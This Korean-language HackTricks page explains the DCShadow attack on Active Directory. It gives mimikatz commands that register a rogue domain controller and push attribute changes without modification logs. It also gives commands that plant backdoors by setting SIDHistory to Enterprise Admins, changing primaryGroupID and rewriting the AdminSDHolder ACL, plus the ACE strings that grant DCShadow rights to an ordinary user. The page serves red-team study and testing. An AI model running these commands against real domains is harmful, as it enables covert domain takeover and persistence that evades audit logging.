<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>


# DCShadow

이는 AD에 **새로운 도메인 컨트롤러**를 등록하고, 지정된 객체에 대해 **SIDHistory, SPN** 등의 **속성을 수정**하면서 **수정 내역에 대한 로그를 남기지 않습니다**. **DA 권한**이 필요하며 **루트 도메인** 내부에 있어야 합니다.\
잘못된 데이터를 사용하면 상당히 불쾌한 로그가 표시될 수 있습니다.

공격을 수행하기 위해 2개의 mimikatz 인스턴스가 필요합니다. 그 중 하나는 SYSTEM 권한으로 RPC 서버를 시작합니다(수행하려는 변경 사항을 여기에 지정해야 함). 다른 인스턴스는 값을 수정하는 데 사용됩니다:

{% code title="mimikatz1 (RPC 서버)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% code title="mimikatz2 (push) - DA 또는 유사한 권한 필요" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

**`elevate::token`**이 `mimikatz1` 세션에서 작동하지 않는다는 것을 알아두세요. 이는 스레드의 권한을 상승시키지만, **프로세스의 권한**을 상승시켜야 합니다.\
또한 "LDAP" 객체를 선택할 수도 있습니다: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

다음 최소한의 권한을 가진 DA 또는 사용자로부터 변경 사항을 푸시할 수 있습니다:

* **도메인 객체**에서:
* _DS-Install-Replica_ (도메인에 대한 복제 추가/제거)
* _DS-Replication-Manage-Topology_ (복제 토폴로지 관리)
* _DS-Replication-Synchronize_ (복제 동기화)
* **구성 컨테이너**의 **Sites 객체** (및 해당 하위 항목):
* _CreateChild 및 DeleteChild_
* **DC로 등록된 컴퓨터의 객체**:
* _WriteProperty_ (Write 아님)
* **대상 객체**:
* _WriteProperty_ (Write 아님)

[**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1)를 사용하여 특권이 없는 사용자에게 이러한 권한을 부여할 수 있습니다 (이는 일부 로그를 남길 것임에 유의하세요). 이는 DA 권한을 가지는 것보다 훨씬 제한적입니다.\
예를 들어: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` 이는 사용자 이름이 _**student1**_이고, _**mcorp-student1**_ 기기에 로그인할 때 _**root1user**_ 객체에 대한 DCShadow 권한을 가지도록 합니다.

## DCShadow를 사용하여 백도어 생성하기

{% code title="SIDHistory에 Enterprise Admins를 사용자로 설정" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% code title="PrimaryGroupID 변경 (사용자를 도메인 관리자 그룹의 구성원으로 추가)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% code title="AdminSDHolder의 ntSecurityDescriptor 수정 (사용자에게 전체 제어 권한 부여)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
{% endcode %}

## Shadowception - DCShadow를 사용하여 DCShadow 권한 부여 (수정된 권한 로그 없음)

다음 ACE를 사용자의 SID와 함께 추가해야 합니다:

* 도메인 개체에 대해:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* 공격자 컴퓨터 개체에 대해: `(A;;WP;;;UserSID)`
* 대상 사용자 개체에 대해: `(A;;WP;;;UserSID)`
* 구성 컨테이너의 Sites 개체에 대해: `(A;CI;CCDC;;;UserSID)`

객체의 현재 ACE를 가져오려면: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

이 경우에는 하나만 수정하는 것이 아니라 **여러 가지 변경**을 해야 합니다. 따라서 **mimikatz1 세션** (RPC 서버)에서 각 변경 사항과 함께 **`/stack` 매개변수**를 사용하세요. 이렇게 하면 루지 서버에서 모든 변경 사항을 수행하기 위해 **`/push`**를 한 번만 실행하면 됩니다.



[**ired.team에서 DCShadow에 대한 자세한 정보를 확인하세요.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** 팔로우하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
